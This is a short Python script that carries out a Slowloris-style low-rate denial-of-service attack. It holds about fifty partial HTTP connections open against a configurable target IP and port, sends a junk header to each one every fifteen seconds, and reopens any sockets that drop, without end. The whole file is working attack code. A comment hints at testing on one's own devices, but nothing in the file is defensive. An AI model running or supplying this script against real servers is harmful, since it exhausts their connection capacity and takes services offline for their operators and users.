import socket
import time
import random


TARGET_IP = "192.x.x.x"  # Replace this based on your devices
TARGET_PORT = 5000
CONNECTION_COUNT = 50
DELAY_INTERVAL = 15        

sockets_list = []

print(f"[START] Initializing low-rate attack on {TARGET_IP}:{TARGET_PORT}...")


for i in range(CONNECTION_COUNT):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((TARGET_IP, TARGET_PORT))
        
        
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        
        sockets_list.append(s)
        print(f"[INFO] Socket {i+1} connected successfully.")
    except socket.error:
        print(f"[WARN] Connection timeout or failure at socket {i+1}")
        break

print(f"[ACTIVE] Maintained {len(sockets_list)} active connections. Sending keep-alive headers...")


while True:
    print(f"[KEEP-ALIVE] Sending heartbeat data to maintain open connections. Sockets count: {len(sockets_list)}")
    for s in sockets_list:
        try:
            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
        except socket.error:
            sockets_list.remove(s)
            
   
    diff = CONNECTION_COUNT - len(sockets_list)
    for _ in range(diff):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            sockets_list.append(s)
        except socket.error:
            break

    time.sleep(DELAY_INTERVAL)